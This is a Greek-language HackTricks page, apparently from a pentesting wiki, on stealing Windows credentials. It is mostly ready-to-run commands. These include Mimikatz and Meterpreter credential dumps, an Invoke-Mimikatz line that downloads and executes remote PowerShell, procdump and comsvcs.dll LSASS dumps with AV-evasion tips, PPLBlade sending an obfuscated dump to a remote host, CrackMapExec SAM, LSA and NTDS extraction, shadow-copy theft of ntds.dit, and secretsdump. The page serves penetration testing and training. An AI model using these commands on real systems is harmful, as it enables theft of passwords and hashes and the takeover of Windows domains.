# Κλοπή Διαπιστευτηρίων Windows

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστήριξη HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Διαπιστευτήρια Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Βρείτε άλλα πράγματα που μπορεί να κάνει το Mimikatz στη** [**σελίδα αυτή**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Μάθετε για μερικές πιθανές προστασίες πιστοποίησης εδώ.**](credentials-protections.md) **Αυτές οι προστασίες θα μπορούσαν να αποτρέψουν το Mimikatz από το να εξάγει ορισμένες πιστοποιήσεις.**

## Πιστοποιήσεις με Meterpreter

Χρησιμοποιήστε το [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **που** έχω δημιουργήσει για να **αναζητήσετε κωδικούς πρόσβασης και κατακερματισμούς** μέσα στο θύμα.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Παράκαμψη AV

### Procdump + Mimikatz

Καθώς το **Procdump από** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**είναι ένα νόμιμο εργαλείο της Microsoft**, δεν ανιχνεύεται από τον Defender.\
Μπορείτε να χρησιμοποιήσετε αυτό το εργαλείο για να **dump τον lsass process**, **κατεβάσετε το dump** και **εξάγετε** τα **credentials τοπικά** από το dump.

{% code title="Dump lsass" %}
```bash
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
{% endcode %}

{% code title="Εξαγωγή διαπιστευτηρίων από την απόθεση" %}
```c
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
{% endcode %}

Αυτή η διαδικασία γίνεται αυτόματα με το [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Σημείωση**: Ορισμένα **AV** μπορεί να **ανιχνεύσουν** ως **κακόβουλο** τη χρήση του **procdump.exe για να κάνετε dump το lsass.exe**, αυτό συμβαίνει επειδή **ανιχνεύουν** τη συμβολοσειρά **"procdump.exe" και "lsass.exe"**. Έτσι, είναι **πιο κρυφό** να **περάσετε** ως **όρισμα** το **PID** του lsass.exe στο procdump **αντί για** το **όνομα lsass.exe.**

### Dumping lsass με **comsvcs.dll**

Ένα DLL που ονομάζεται **comsvcs.dll** που βρίσκεται στο `C:\Windows\System32` είναι υπεύθυνο για **dumping process memory** σε περίπτωση κρασάρισματος. Αυτό το DLL περιλαμβάνει μια **λειτουργία** που ονομάζεται **`MiniDumpW`**, σχεδιασμένη να καλείται χρησιμοποιώντας το `rundll32.exe`.\
Δεν είναι σχετικό να χρησιμοποιήσετε τα πρώτα δύο ορίσματα, αλλά το τρίτο χωρίζεται σε τρία συστατικά. Το ID της διαδικασίας που θα γίνει dump αποτελεί το πρώτο συστατικό, η τοποθεσία του αρχείου dump αντιπροσωπεύει το δεύτερο, και το τρίτο συστατικό είναι αυστηρά η λέξη **full**. Δεν υπάρχουν εναλλακτικές επιλογές.\
Αφού αναλυθούν αυτά τα τρία συστατικά, το DLL εμπλέκεται στη δημιουργία του αρχείου dump και στη μεταφορά της μνήμης της καθορισμένης διαδικασίας σε αυτό το αρχείο.\
Η χρήση του **comsvcs.dll** είναι εφικτή για το dumping της διαδικασίας lsass, εξαλείφοντας την ανάγκη να ανεβάσετε και να εκτελέσετε το procdump. Αυτή η μέθοδος περιγράφεται λεπτομερώς στο [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

Η ακόλουθη εντολή χρησιμοποιείται για την εκτέλεση:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Μπορείτε να αυτοματοποιήσετε αυτή τη διαδικασία με** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dumping lsass με τον Διαχειριστή Εργασιών**

1. Κάντε δεξί κλικ στη Γραμμή Εργασιών και επιλέξτε Διαχειριστής Εργασιών
2. Κάντε κλικ σε Περισσότερες λεπτομέρειες
3. Αναζητήστε τη διαδικασία "Local Security Authority Process" στην καρτέλα Διαδικασίες
4. Κάντε δεξί κλικ στη διαδικασία "Local Security Authority Process" και επιλέξτε "Create dump file".

### Dumping lsass με το procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) είναι ένα υπογεγραμμένο δυαδικό αρχείο της Microsoft που είναι μέρος της σουίτας [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpin lsass with PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) είναι ένα εργαλείο εκφόρτωσης προστατευμένων διαδικασιών που υποστηρίζει την απόκρυψη εκφορτώσεων μνήμης και τη μεταφορά τους σε απομακρυσμένους σταθμούς εργασίας χωρίς να τις αποθηκεύει στον δίσκο.

**Κύριες λειτουργίες**:

1. Παράκαμψη προστασίας PPL
2. Απόκρυψη αρχείων εκφόρτωσης μνήμης για να αποφευχθούν οι μηχανισμοί ανίχνευσης βασισμένοι σε υπογραφές του Defender
3. Μεταφόρτωση εκφόρτωσης μνήμης με μεθόδους RAW και SMB χωρίς να αποθηκεύεται στον δίσκο (χωρίς αρχείο εκφόρτωσης)

{% code overflow="wrap" %}
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
{% endcode %}

## CrackMapExec

### Εξαγωγή SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Εκχύλιση μυστικών LSA
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Εκχύλισμα το NTDS.dit από τον στόχο DC
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Εξαγωγή του ιστορικού κωδικών πρόσβασης NTDS.dit από τον στόχο DC
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Εμφάνιση του χαρακτηριστικού pwdLastSet για κάθε λογαριασμό NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

Αυτά τα αρχεία θα πρέπει να **βρίσκονται** στο _C:\windows\system32\config\SAM_ και _C:\windows\system32\config\SYSTEM._ Αλλά **δεν μπορείτε απλώς να τα αντιγράψετε με κανονικό τρόπο** επειδή είναι προστατευμένα.

### From Registry

Ο ευκολότερος τρόπος για να κλέψετε αυτά τα αρχεία είναι να πάρετε ένα αντίγραφο από το μητρώο:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Κατεβάστε** αυτά τα αρχεία στη μηχανή Kali σας και **εξαγάγετε τους κατακερματισμούς** χρησιμοποιώντας:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Μπορείτε να εκτελέσετε αντίγραφο προστατευμένων αρχείων χρησιμοποιώντας αυτή την υπηρεσία. Πρέπει να είστε Διαχειριστής.

#### Using vssadmin

Το δυαδικό αρχείο vssadmin είναι διαθέσιμο μόνο σε εκδόσεις Windows Server
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Αλλά μπορείτε να κάνετε το ίδιο από το **Powershell**. Αυτό είναι ένα παράδειγμα **του πώς να αντιγράψετε το αρχείο SAM** (ο σκληρός δίσκος που χρησιμοποιείται είναι "C:" και αποθηκεύεται στο C:\users\Public) αλλά μπορείτε να το χρησιμοποιήσετε για να αντιγράψετε οποιοδήποτε προστατευμένο αρχείο:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
### Invoke-NinjaCopy

Τέλος, μπορείτε επίσης να χρησιμοποιήσετε το [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) για να κάνετε ένα αντίγραφο των SAM, SYSTEM και ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Credentials - NTDS.dit**

Το αρχείο **NTDS.dit** είναι γνωστό ως η καρδιά του **Active Directory**, κρατώντας κρίσιμα δεδομένα σχετικά με αντικείμενα χρηστών, ομάδες και τις συμμετοχές τους. Είναι εκεί που αποθηκεύονται οι **password hashes** για τους χρήστες του τομέα. Αυτό το αρχείο είναι μια βάση δεδομένων **Extensible Storage Engine (ESE)** και βρίσκεται στο **_%SystemRoom%/NTDS/ntds.dit_**.

Μέσα σε αυτή τη βάση δεδομένων, διατηρούνται τρεις κύριοι πίνακες:

- **Data Table**: Αυτός ο πίνακας είναι υπεύθυνος για την αποθήκευση λεπτομερειών σχετικά με αντικείμενα όπως χρήστες και ομάδες.
- **Link Table**: Παρακολουθεί τις σχέσεις, όπως τις συμμετοχές σε ομάδες.
- **SD Table**: **Security descriptors** για κάθε αντικείμενο κρατούνται εδώ, εξασφαλίζοντας την ασφάλεια και τον έλεγχο πρόσβασης για τα αποθηκευμένα αντικείμενα.

Περισσότερες πληροφορίες σχετικά με αυτό: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Τα Windows χρησιμοποιούν το _Ntdsa.dll_ για να αλληλεπιδρούν με αυτό το αρχείο και χρησιμοποιείται από το _lsass.exe_. Στη συνέχεια, **μέρος** του αρχείου **NTDS.dit** θα μπορούσε να βρίσκεται **μέσα στη μνήμη του `lsass`** (μπορείτε να βρείτε τα τελευταία προσπελάσιμα δεδομένα πιθανώς λόγω της βελτίωσης απόδοσης χρησιμοποιώντας μια **cache**).

#### Decrypting the hashes inside NTDS.dit

Ο hash κρυπτογραφείται 3 φορές:

1. Αποκρυπτογράφηση του Password Encryption Key (**PEK**) χρησιμοποιώντας το **BOOTKEY** και **RC4**.
2. Αποκρυπτογράφηση του **hash** χρησιμοποιώντας το **PEK** και **RC4**.
3. Αποκρυπτογράφηση του **hash** χρησιμοποιώντας το **DES**.

Το **PEK** έχει την **ίδια τιμή** σε **κάθε domain controller**, αλλά είναι **κρυπτογραφημένο** μέσα στο αρχείο **NTDS.dit** χρησιμοποιώντας το **BOOTKEY** του **SYSTEM αρχείου του domain controller (είναι διαφορετικό μεταξύ των domain controllers)**. Γι' αυτό, για να αποκτήσετε τα credentials από το αρχείο NTDS.dit **χρειάζεστε τα αρχεία NTDS.dit και SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Copying NTDS.dit using Ntdsutil

Διαθέσιμο από τα Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Μπορείτε επίσης να χρησιμοποιήσετε το [**trick volume shadow copy**](./#stealing-sam-and-system) για να αντιγράψετε το αρχείο **ntds.dit**. Θυμηθείτε ότι θα χρειαστείτε επίσης ένα αντίγραφο του αρχείου **SYSTEM** (ξανά, [**dump it from the registry or use the volume shadow copy**](./#stealing-sam-and-system) trick).

### **Εξαγωγή κατακερματισμών από το NTDS.dit**

Μόλις έχετε **obtained** τα αρχεία **NTDS.dit** και **SYSTEM**, μπορείτε να χρησιμοποιήσετε εργαλεία όπως το _secretsdump.py_ για να **extract the hashes**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Μπορείτε επίσης να **εξάγετε αυτά αυτόματα** χρησιμοποιώντας έναν έγκυρο χρήστη διαχειριστή τομέα:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Για **μεγάλες NTDS.dit αρχεία** συνιστάται να τα εξάγετε χρησιμοποιώντας [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Τέλος, μπορείτε επίσης να χρησιμοποιήσετε το **metasploit module**: _post/windows/gather/credentials/domain\_hashdump_ ή **mimikatz** `lsadump::lsa /inject`

### **Εξαγωγή αντικειμένων τομέα από NTDS.dit σε βάση δεδομένων SQLite**

Τα αντικείμενα NTDS μπορούν να εξαχθούν σε μια βάση δεδομένων SQLite με [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Όχι μόνο μυστικά εξάγονται αλλά και ολόκληρα τα αντικείμενα και τα χαρακτηριστικά τους για περαιτέρω εξαγωγή πληροφοριών όταν το αρχείο NTDS.dit έχει ήδη ανακτηθεί.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
The `SYSTEM` hive είναι προαιρετικό αλλά επιτρέπει την αποκρυπτογράφηση μυστικών (NT & LM hashes, συμπληρωματικά διαπιστευτήρια όπως καθαρού κειμένου κωδικούς πρόσβασης, kerberos ή κλειδιά εμπιστοσύνης, NT & LM ιστορικά κωδικών πρόσβασης). Μαζί με άλλες πληροφορίες, εξάγονται τα εξής δεδομένα: λογαριασμοί χρηστών και μηχανών με τους hash τους, σημαίες UAC, χρονική σήμανση για την τελευταία σύνδεση και αλλαγή κωδικού πρόσβασης, περιγραφή λογαριασμών, ονόματα, UPN, SPN, ομάδες και αναδρομικές συμμετοχές, δέντρο οργανωτικών μονάδων και συμμετοχή, αξιόπιστοι τομείς με τύπους εμπιστοσύνης, κατεύθυνση και χαρακτηριστικά...

## Lazagne

Κατεβάστε το δυαδικό αρχείο από [εδώ](https://github.com/AlessandroZ/LaZagne/releases). μπορείτε να χρησιμοποιήσετε αυτό το δυαδικό αρχείο για να εξάγετε διαπιστευτήρια από διάφορα λογισμικά.
```
lazagne.exe all
```
## Άλλα εργαλεία για την εξαγωγή διαπιστευτηρίων από το SAM και LSASS

### Windows credentials Editor (WCE)

Αυτό το εργαλείο μπορεί να χρησιμοποιηθεί για την εξαγωγή διαπιστευτηρίων από τη μνήμη. Κατεβάστε το από: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Εξαγωγή διαπιστευτηρίων από το αρχείο SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Εξαγωγή διαπιστευτηρίων από το αρχείο SAM
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Κατεβάστε το από: [ http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7) και απλά **εκτελέστε το** και οι κωδικοί πρόσβασης θα εξαχθούν.

## Αμυντικές Τακτικές

[**Μάθετε για κάποιες προστασίες κωδικών πρόσβασης εδώ.**](credentials-protections.md)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
